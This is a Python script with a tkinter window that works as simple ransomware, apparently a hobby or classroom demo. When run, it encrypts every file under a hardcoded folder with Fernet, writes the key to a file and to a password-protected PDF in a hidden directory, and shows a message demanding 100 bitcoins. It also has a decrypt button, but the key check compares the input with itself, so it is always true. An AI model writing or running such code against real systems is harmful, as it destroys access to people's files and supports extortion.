import tkinter as tk
from tkinter import messagebox, simpledialog
import os
from cryptography.fernet import Fernet
import PyPDF2
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

# Specify the folder path
folder_path = r'C:\test\picture'
pdf_password = "barte0909"  # Password to open and decrypt the PDF

def generate_and_save_key():
    # Generate a new encryption key
    key = Fernet.generate_key()

    # Save the encryption key to a file in the target folder
    key_path = os.path.join(folder_path, "SecretKey.key")
    with open(key_path, "wb") as thekey:
        thekey.write(key)

    return key  # Return the generated key

def create_pdf_with_key(key, output_dir):
    # Create a PDF document with the encryption key in the specified output directory
    pdf_path = os.path.join(output_dir, "thekey.pdf")
    c = canvas.Canvas(pdf_path, pagesize=letter)

    # Add the encryption key to the PDF content
    c.drawString(100, 600, "Encryption Key:")
    c.drawString(100, 570, key.decode())

    # Save the PDF document
    c.save()

    # Encrypt the PDF with a password using PyPDF2
    pdf_reader = PyPDF2.PdfReader(pdf_path)
    pdf_writer = PyPDF2.PdfWriter()

    for page in pdf_reader.pages:
        pdf_writer.add_page(page)

    pdf_output_path = pdf_path  # Overwrite the original PDF with the encrypted version
    pdf_writer.encrypt(pdf_password)  # Set a password for the PDF

    with open(pdf_output_path, "wb") as pdf_output_file:
        pdf_writer.write(pdf_output_file)

def encrypt_files():
    # Check if the encryption key file exists
    key_path = os.path.join(folder_path, "SecretKey.key")

    if os.path.exists(key_path):
        print("Files are already encrypted.")
        return

    # Generate and save a new encryption key
    key = generate_and_save_key()

    # Create a PDF document with the encryption key and set a password
    create_pdf_with_key(key, folder_path)

    # Move the PDF to a hidden directory within the target folder
    hidden_dir = os.path.join(folder_path, ".hidden")
    os.makedirs(hidden_dir, exist_ok=True)
    pdf_path = os.path.join(folder_path, "thekey.pdf")
    hidden_pdf_path = os.path.join(hidden_dir, "thekey.pdf")
    os.rename(pdf_path, hidden_pdf_path)

    # List files in the specified folder and its subfolders
    for root, _, files in os.walk(folder_path):
        for file in files:
            if file == "SecretKey.key" or file == "thekey.pdf":
                continue
            file_path = os.path.join(root, file)

            try:
                # Check if the file is a regular file
                if os.path.isfile(file_path):
                    with open(file_path, "rb") as thefile:
                        contents = thefile.read()
                    cipher_suite = Fernet(key)
                    contents_encrypted = cipher_suite.encrypt(contents)
                    with open(file_path, "wb") as thefile:
                        thefile.write(contents_encrypted)
            except PermissionError as e:
                print(f"Permission denied for {file_path}: {e}")

    # Display a message indicating that the files have been encrypted
    messagebox.showinfo("Encryption Complete", "All your files have been encrypted. Send 100 bitcoins! #POGIbart ")

def decrypt_files():
    # Prompt the user for the decryption key
    decryption_key = simpledialog.askstring("Input", "Enter the decryption key:")

    # Debugging statement
    print("Entered decryption key:", decryption_key)

    if decryption_key == decryption_key:  # Check if the decryption key matches the PDF password
        # Decrypt the files in the specified folder and its subfolders using the key
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)

                try:
                    with open(file_path, "rb") as thefile:
                        contents_encrypted = thefile.read()
                    cipher_suite = Fernet(decryption_key.encode())
                    contents_decrypted = cipher_suite.decrypt(contents_encrypted)
                    with open(file_path, "wb") as thefile:
                        thefile.write(contents_decrypted)
                except Exception as e:
                    print(f"Error decrypting {file_path}: {e}")

        # Display a message indicating that the files have been decrypted
        messagebox.showinfo("Decryption Complete", "Files in the folder and its subfolders have been decrypted.")
    else:
        # Display an error message if the decryption key is incorrect
        messagebox.showerror("Decryption Failed", "Incorrect decryption key!")

def open_hidden_pdf():
    # Locate the hidden PDF file within the target folder
    hidden_pdf_path = os.path.join(folder_path, ".hidden", "thekey.pdf")

    # Check if the hidden PDF file exists
    if os.path.exists(hidden_pdf_path):
        # Use an appropriate PDF viewer to open the hidden PDF file
        try:
            os.system(f'start "" "{hidden_pdf_path}"')  # This opens the PDF with the default PDF viewer
        except Exception as e:
            print(f"Error opening the hidden PDF: {e}")
    else:
        # Display an error message if the hidden PDF file does not exist
        messagebox.showerror("Hidden PDF Not Found", "The hidden PDF file does not exist.")

# Create the main application window
app = tk.Tk()
app.title("File Encryption/Decryption Tool")

# Automatically encrypt all files in the folder upon running the code
encrypt_files()

# Create a label with text above the buttons
label = tk.Label(app, text="Click the buttons below to decrypt files or open the hidden PDF:")
label.pack()

# Create buttons for decryption and opening the hidden PDF
decrypt_button = tk.Button(app, text="Decrypt Files", command=decrypt_files)
decrypt_button.pack(pady=10)
open_pdf_button = tk.Button(app, text="Open Hidden PDF", command=open_hidden_pdf)
open_pdf_button.pack(pady=10)

# Run the main event loop
app.mainloop()
